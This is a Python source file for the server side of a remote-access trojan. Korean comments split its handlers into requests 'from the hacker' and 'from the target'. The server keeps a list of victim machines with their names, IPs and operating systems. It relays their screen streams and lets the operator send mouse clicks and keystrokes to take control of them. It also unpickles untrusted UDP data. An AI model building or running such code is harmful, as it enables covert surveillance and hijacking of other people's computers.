import numpy as np
from socketio import Server, WSGIApp
import socket
import pickle
import cv2

sio = Server()
app = WSGIApp(sio)

targets = []
targetScreen = {}

@sio.event
def connect(sid, environ, auth):
  print('connect ', sid)
  sio.emit('info', room=sid)

@sio.event
def disconnect(sid):
  global targets
  print('disconnect ', sid)
  for i, v in enumerate(targets):
    if v['sid'] == sid:
      targets.pop(i)
      sio.emit('del target', {'sid': sid})
      break


# 해커로부터 오는 요청
@sio.on('target list')
def getTargetList(sid):
  sio.emit('t list', {'targets': targets}, room=sid)

@sio.on('remote req')
def remoteReq(sid, data):
  global targetScreen
  sio.emit('remote start', room=data['target'])

  def clickEvent(event, x, y, flags, param):
    if event == cv2.EVENT_LBUTTONUP:
      sio.emit('L click', {
        'x': (x/targetScreen['streamWidth']*100)*targetScreen['width']/100,
        'y': (y/targetScreen['streamHeight']*100)*targetScreen['height']/100
      }, room=data['target'])
    elif event == cv2.EVENT_RBUTTONUP:
      sio.emit('R click', {
        'x': (x/targetScreen['streamWidth']*100)*targetScreen['width']/100,
        'y': (y/targetScreen['streamHeight']*100)*targetScreen['height']/100
      }, room=data['target'])

  s=socket.socket(socket.AF_INET , socket.SOCK_DGRAM)
  ip=""
  port=8001
  s.bind((ip,port))
  cv2.namedWindow('server')
  cv2.setMouseCallback('server', clickEvent)
  while True:
    x=s.recvfrom(1000000)
    screenData=x[0]
    screenData=pickle.loads(screenData)
    screenData = cv2.imdecode(screenData, cv2.IMREAD_COLOR)
    cv2.imshow('server', screenData)
    key = cv2.waitKey(10)
    if key == 27:
      sio.emit('stop remote', room=data['target'])
      break
    elif key != -1:
      sio.emit('key', {'key': chr(key)}, room=data['target'])
  cv2.destroyAllWindows()


# 타겟으로부터 오는 요청
@sio.on('my info')
def setTargetInfo(sid, data):
  targets.append({
    'name': data['name'],
    'ip': data['ip'],
    'os': data['os'],
    'sid': sid
  })
  print(targets)

@sio.on('stream monitor')
def stream(sid, data):
  sio.emit('stream', {'src': data['src']}, room=data['hacker'])

@sio.on('screen info')
def targetScreen(sid, data):
  global targetScreen
  targetScreen = {
    'width': data['width'],
    'height': data['height'],
    'streamWidth': data['streamWidth'],
    'streamHeight': data['streamHeight']
  }